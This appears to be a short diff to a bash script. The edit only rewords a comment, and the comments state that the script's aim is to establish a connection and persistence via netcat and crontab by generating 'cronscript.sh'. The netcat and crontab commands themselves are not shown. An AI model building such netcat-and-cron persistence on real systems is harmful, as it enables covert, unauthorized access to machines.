@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #The intent of this script is to establish connection and persistence via netcat and crontab
-#Note: This script creates a new script for the intent of crontab to run the new script.
+#This script creates a new script titled "cronscript.sh" at the current working directory for the crontab to function correctly
 
 echo "#!/bin/bash" > cronscript.sh
 
